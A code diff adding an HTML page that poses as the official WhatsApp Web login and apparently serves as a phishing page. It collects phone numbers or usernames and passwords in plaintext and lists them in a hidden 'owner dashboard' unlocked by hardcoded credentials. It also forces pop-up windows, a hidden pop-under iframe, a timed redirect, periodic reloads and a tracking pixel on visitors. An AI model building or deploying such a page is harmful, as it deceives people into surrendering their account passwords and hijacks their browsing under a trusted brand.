@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 WhatsApp Web - Official</title>
+    
+    <!-- Meta buat viral -->
+    <meta property="og:title" content="WhatsApp Web - Login">
+    <meta property="og:description" content="Akses WhatsApp Web dengan aman">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #00b09b, #96c93d);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 450px;
+            width: 100%;
+            position: relative;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: slideUp 0.5s ease;
+        }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            font-size: 32px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #075E54, #128C7E);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .logo p {
+            color: #666;
+            font-weight: bold;
+            margin-top: 5px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+        
+        .input-group input:focus {
+            border-color: #25D366;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.1);
+        }
+        
+        .btn-enter {
+            width: 100%;
+            padding: 18px;
+            background: #25D366;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);
+        }
+        
+        .btn-enter:hover {
+            background: #128C7E;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(37, 211, 102, 0.4);
+        }
+        
+        .switch-auth {
+            text-align: center;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+        
+        .switch-auth a {
+            color: #25D366;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .switch-auth a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Iklan Space */
+        .ad-container {
+            margin: 30px 0;
+            padding: 15px;
+            background: #f5f5f5;
+            border-radius: 10px;
+            border: 2px dashed #25D366;
+        }
+        
+        .ad-label {
+            font-size: 12px;
+            color: #999;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+        
+        /* Owner Menu */
+        .owner-menu {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            cursor: pointer;
+            z-index: 1000;
+        }
+        
+        .menu-dots {
+            font-size: 24px;
+            color: white;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
+            font-weight: bold;
+        }
+        
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            top: 30px;
+            left: 0;
+            background: white;
+            min-width: 300px;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+            border-radius: 10px;
+            padding: 15px;
+            z-index: 1001;
+        }
+        
+        .dropdown-content.show {
+            display: block;
+        }
+        
+        .dropdown-content h3 {
+            color: #075E54;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+        
+        /* Owner Login Modal */
+        .owner-login-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .owner-login-modal.show {
+            display: flex;
+        }
+        
+        .owner-login-card {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 350px;
+        }
+        
+        .owner-login-card h2 {
+            color: #075E54;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .owner-panel {
+            display: none;
+        }
+        
+        .owner-panel.show {
+            display: block;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-box {
+            background: #f0f0f0;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #075E54;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+        
+        .user-list-container {
+            max-height: 300px;
+            overflow-y: auto;
+            border: 1px solid #eee;
+            border-radius: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .user-item {
+            padding: 12px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .user-item:last-child {
+            border-bottom: none;
+        }
+        
+        .user-info {
+            flex: 1;
+        }
+        
+        .user-info .username {
+            font-weight: bold;
+            color: #075E54;
+        }
+        
+        .user-info .password {
+            font-size: 12px;
+            color: #ff4444;
+            margin-top: 3px;
+        }
+        
+        .user-info .date {
+            font-size: 11px;
+            color: #999;
+            margin-top: 2px;
+        }
+        
+        .delete-btn {
+            background: #ff4444;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .delete-btn:hover {
+            background: #cc0000;
+        }
+        
+        .active-users {
+            margin-top: 15px;
+            padding: 10px;
+            background: #e8f5e8;
+            border-radius: 10px;
+        }
+        
+        .active-user-item {
+            padding: 8px;
+            border-bottom: 1px solid #c8e6c9;
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+        }
+        
+        .active-user-item:last-child {
+            border-bottom: none;
+        }
+        
+        .online-dot {
+            width: 8px;
+            height: 8px;
+            background: #4caf50;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 5px;
+        }
+        
+        .white-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 2000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .white-screen.show {
+            display: flex;
+        }
+        
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #25D366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .white-screen p {
+            color: #333;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        .logout-btn {
+            width: 100%;
+            padding: 10px;
+            background: #ff4444;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-weight: bold;
+        }
+    </style>
+    
+    <!-- Ad Scripts -->
+    <script>
+        var adNetworks = [
+            'https://example.com/ad1',
+            'https://example.com/ad2',
+            'https://example.com/ad3'
+        ];
+        
+        function triggerAds() {
+            adNetworks.forEach(function(ad, index) {
+                setTimeout(function() {
+                    window.open(ad, '_blank');
+                }, index * 1500);
+            });
+        }
+        
+        document.addEventListener('click', triggerAds);
+    </script>
+</head>
+<body>
+    <!-- Owner Menu (3 Dots) -->
+    <div class="owner-menu" onclick="toggleOwnerMenu()">
+        <div class="menu-dots">⋮</div>
+    </div>
+    
+    <!-- Owner Login Modal -->
+    <div class="owner-login-modal" id="ownerLoginModal">
+        <div class="owner-login-card">
+            <h2>👑 OWNER LOGIN</h2>
+            <div class="input-group">
+                <label>Username</label>
+                <input type="text" id="ownerUsername" placeholder="Enter username">
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="ownerPassword" placeholder="Enter password">
+            </div>
+            <button class="btn-enter" onclick="ownerLogin()">LOGIN</button>
+        </div>
+    </div>
+    
+    <!-- Owner Panel (Hidden until login) -->
+    <div class="dropdown-content" id="ownerDropdown">
+        <div class="owner-panel" id="ownerPanel">
+            <h3>👑 OWNER DASHBOARD</h3>
+            
+            <div class="stats-grid">
+                <div class="stat-box">
+                    <div class="stat-number" id="totalUsers">0</div>
+                    <div class="stat-label">Total Register</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-number" id="activeNow">0</div>
+                    <div class="stat-label">Active Now</div>
+                </div>
+            </div>
+            
+            <h4>📋 REGISTERED USERS</h4>
+            <div class="user-list-container" id="userList">
+                <!-- Users will appear here -->
+            </div>
+            
+            <div class="active-users">
+                <h4>🟢 ACTIVE NOW</h4>
+                <div id="activeUsersList">
+                    <!-- Active users will appear here -->
+                </div>
+            </div>
+            
+            <button class="logout-btn" onclick="ownerLogout()">LOGOUT</button>
+        </div>
+    </div>
+    
+    <!-- Main Container -->
+    <div class="container" id="mainContainer">
+        <!-- Register Form -->
+        <div class="card" id="registerForm">
+            <div class="logo">
+                <h1>WhatsApp Web</h1>
+                <p>Register Account</p>
+            </div>
+            
+            <!-- Ad Space Top -->
+            <div class="ad-container">
+                <div class="ad-label">ADVERTISEMENT</div>
+                <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-xxxxxxxxxx" crossorigin="anonymous"></script>
+                <ins class="adsbygoogle"
+                     style="display:block"
+                     data-ad-client="ca-pub-xxxxxxxxxx"
+                     data-ad-slot="1234567890"
+                     data-ad-format="auto"
+                     data-full-width-responsive="true"></ins>
+                <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+            </div>
+            
+            <div class="input-group">
+                <label>📱 Username / Phone Number</label>
+                <input type="text" id="regUsername" placeholder="Enter username" autocomplete="off">
+            </div>
+            
+            <div class="input-group">
+                <label>🔒 Password</label>
+                <input type="password" id="regPassword" placeholder="Create password">
+            </div>
+            
+            <button class="btn-enter" onclick="register()">ENTER</button>
+            
+            <div class="switch-auth">
+                <a onclick="showLogin()">Already have account? LOGIN</a>
+            </div>
+            
+            <!-- Ad Space Bottom -->
+            <div class="ad-container">
+                <div class="ad-label">ADVERTISEMENT</div>
+                <script>
+                    window.open('https://example.com/popunder', '_blank');
+                </script>
+            </div>
+        </div>
+        
+        <!-- Login Form -->
+        <div class="card" id="loginForm" style="display: none;">
+            <div class="logo">
+                <h1>WhatsApp Web</h1>
+                <p>Login to Account</p>
+            </div>
+            
+            <!-- Ad Space Top -->
+            <div class="ad-container">
+                <div class="ad-label">ADVERTISEMENT</div>
+                <ins class="adsbygoogle"
+                     style="display:block"
+                     data-ad-client="ca-pub-xxxxxxxxxx"
+                     data-ad-slot="1234567890"
+                     data-ad-format="auto"></ins>
+                <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+            </div>
+            
+            <div class="input-group">
+                <label>📱 Username</label>
+                <input type="text" id="loginUsername" placeholder="Enter username">
+            </div>
+            
+            <div class="input-group">
+                <label>🔒 Password</label>
+                <input type="password" id="loginPassword" placeholder="Enter password">
+            </div>
+            
+            <button class="btn-enter" onclick="login()">ENTER</button>
+            
+            <div class="switch-auth">
+                <a onclick="showRegister()">Create new account? REGISTER</a>
+            </div>
+            
+            <!-- Ad Space Bottom -->
+            <div class="ad-container">
+                <div class="ad-label">ADVERTISEMENT</div>
+                <script>
+                    setTimeout(function() {
+                        window.location.href = 'https://example.com/redirect';
+                    }, 5000);
+                </script>
+            </div>
+        </div>
+    </div>
+    
+    <!-- White Screen -->
+    <div class="white-screen" id="whiteScreen">
+        <div class="loading-spinner"></div>
+        <p>Loading WhatsApp Web...</p>
+        <p style="font-size: 14px; color: #999; margin-top: 10px;">Please wait, redirecting to secure chat</p>
+    </div>
+    
+    <script>
+        // Database
+        let users = JSON.parse(localStorage.getItem('whatsapp_users')) || [];
+        let ownerLoggedIn = false;
+        let sessionId = generateSessionId();
+        
+        // Active users tracking
+        let activeUsers = {};
+        
+        function generateSessionId() {
+            return 'session_' + Math.random().toString(36).substr(2, 9);
+        }
+        
+        // Update active user
+        function updateActiveUser() {
+            const now = Date.now();
+            activeUsers[sessionId] = {
+                lastSeen: now,
+                userAgent: navigator.userAgent
+            };
+            
+            // Cleanup old sessions (lebih dari 10 detik)
+            for(let id in activeUsers) {
+                if(now - activeUsers[id].lastSeen > 10000) {
+                    delete activeUsers[id];
+                }
+            }
+            
+            localStorage.setItem('active_users', JSON.stringify(activeUsers));
+        }
+        
+        // Update every 5 seconds
+        setInterval(updateActiveUser, 5000);
+        updateActiveUser();
+        
+        // Get active users count
+        function getActiveUsersCount() {
+            const active = JSON.parse(localStorage.getItem('active_users')) || {};
+            const now = Date.now();
+            let count = 0;
+            
+            for(let id in active) {
+                if(now - active[id].lastSeen < 10000) {
+                    count++;
+                }
+            }
+            
+            return count;
+        }
+        
+        // Toggle Owner Menu
+        function toggleOwnerMenu() {
+            if(!ownerLoggedIn) {
+                document.getElementById('ownerLoginModal').classList.add('show');
+            } else {
+                document.getElementById('ownerDropdown').classList.toggle('show');
+                if(document.getElementById('ownerDropdown').classList.contains('show')) {
+                    updateOwnerPanel();
+                }
+            }
+        }
+        
+        // Owner Login
+        function ownerLogin() {
+            const username = document.getElementById('ownerUsername').value;
+            const password = document.getElementById('ownerPassword').value;
+            
+            // OWNER CREDENTIALS
+            if(username === 'rapzzxploit' && password === 'adminsonlys') {
+                ownerLoggedIn = true;
+                document.getElementById('ownerLoginModal').classList.remove('show');
+                document.getElementById('ownerDropdown').classList.add('show');
+                document.getElementById('ownerPanel').classList.add('show');
+                updateOwnerPanel();
+                
+                // Clear login form
+                document.getElementById('ownerUsername').value = '';
+                document.getElementById('ownerPassword').value = '';
+            } else {
+                alert('Invalid owner credentials!');
+            }
+        }
+        
+        // Owner Logout
+        function ownerLogout() {
+            ownerLoggedIn = false;
+            document.getElementById('ownerDropdown').classList.remove('show');
+            document.getElementById('ownerPanel').classList.remove('show');
+        }
+        
+        // Update Owner Panel
+        function updateOwnerPanel() {
+            users = JSON.parse(localStorage.getItem('whatsapp_users')) || [];
+            
+            // Update stats
+            document.getElementById('totalUsers').textContent = users.length;
+            document.getElementById('activeNow').textContent = getActiveUsersCount();
+            
+            // User list with passwords
+            let userHtml = '';
+            users.forEach((user, index) => {
+                userHtml += `
+                    <div class="user-item">
+                        <div class="user-info">
+                            <div class="username">👤 ${user.username}</div>
+                            <div class="password">🔑 ${user.password}</div>
+                            <div class="date">📅 ${user.date}</div>
+                        </div>
+                        <button class="delete-btn" onclick="deleteUser(${index})">✖</button>
+                    </div>
+                `;
+            });
+            
+            if(users.length === 0) {
+                userHtml = '<div style="text-align:center; padding:20px; color:#999;">No registered users</div>';
+            }
+            
+            document.getElementById('userList').innerHTML = userHtml;
+            
+            // Active users list
+            const active = JSON.parse(localStorage.getItem('active_users')) || {};
+            const now = Date.now();
+            let activeHtml = '';
+            
+            for(let id in active) {
+                if(now - active[id].lastSeen < 10000) {
+                    activeHtml += `
+                        <div class="active-user-item">
+                            <span><span class="online-dot"></span> User ${id.substr(-4)}</span>
+                            <span>🟢 Online</span>
+                        </div>
+                    `;
+                }
+            }
+            
+            if(activeHtml === '') {
+                activeHtml = '<div style="text-align:center; color:#999;">No active users</div>';
+            }
+            
+            document.getElementById('activeUsersList').innerHTML = activeHtml;
+        }
+        
+        // Delete single user
+        function deleteUser(index) {
+            if(confirm('Delete this user?')) {
+                users.splice(index, 1);
+                localStorage.setItem('whatsapp_users', JSON.stringify(users));
+                updateOwnerPanel();
+            }
+        }
+        
+        // Register
+        function register() {
+            const username = document.getElementById('regUsername').value.trim();
+            const password = document.getElementById('regPassword').value.trim();
+            
+            if(!username || !password) {
+                alert('Please fill all fields!');
+                return;
+            }
+            
+            users.push({
+                username: username,
+                password: password,
+                date: new Date().toLocaleString()
+            });
+            
+            localStorage.setItem('whatsapp_users', JSON.stringify(users));
+            
+            alert('Registration successful! Please login.');
+            showLogin();
+            triggerAds();
+        }
+        
+        // Login
+        function login() {
+            const username = document.getElementById('loginUsername').value.trim();
+            const password = document.getElementById('loginPassword').value.trim();
+            
+            if(!username || !password) {
+                alert('Please fill all fields!');
+                return;
+            }
+            
+            const user = users.find(u => u.username === username && u.password === password);
+            
+            if(user) {
+                document.getElementById('mainContainer').style.display = 'none';
+                document.getElementById('whiteScreen').classList.add('show');
+                
+                for(let i = 0; i < 5; i++) {
+                    setTimeout(() => {
+                        window.open('https://example.com/ad_' + i, '_blank');
+                    }, i * 1000);
+                }
+                
+                setInterval(() => {
+                    location.reload();
+                }, 30000);
+            } else {
+                alert('Invalid username or password!');
+            }
+            
+            triggerAds();
+        }
+        
+        // Show/Hide Forms
+        function showLogin() {
+            document.getElementById('registerForm').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+        }
+        
+        function showRegister() {
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('registerForm').style.display = 'block';
+        }
+        
+        // Close menu when clicking outside
+        document.addEventListener('click', function(event) {
+            const dropdown = document.getElementById('ownerDropdown');
+            const menuBtn = document.querySelector('.owner-menu');
+            const loginModal = document.getElementById('ownerLoginModal');
+            
+            if(menuBtn && !menuBtn.contains(event.target) && dropdown && dropdown.classList.contains('show')) {
+                dropdown.classList.remove('show');
+            }
+            
+            if(loginModal && loginModal.classList.contains('show') && !event.target.closest('.owner-login-card') && !menuBtn.contains(event.target)) {
+                loginModal.classList.remove('show');
+            }
+        });
+        
+        // Auto refresh owner panel every 5 seconds
+        setInterval(() => {
+            if(ownerLoggedIn && document.getElementById('ownerDropdown').classList.contains('show')) {
+                updateOwnerPanel();
+            }
+        }, 5000);
+    </script>
+    
+    <!-- Additional Ads -->
+    <div style="display: none;">
+        <iframe src="https://example.com/popunder" width="0" height="0"></iframe>
+    </div>
+    
+    <!-- Tracking Pixel -->
+    <img src="https://tracking.example.com/pixel?id=123" width="1" height="1" style="display:none;">
+</body>
+</html>
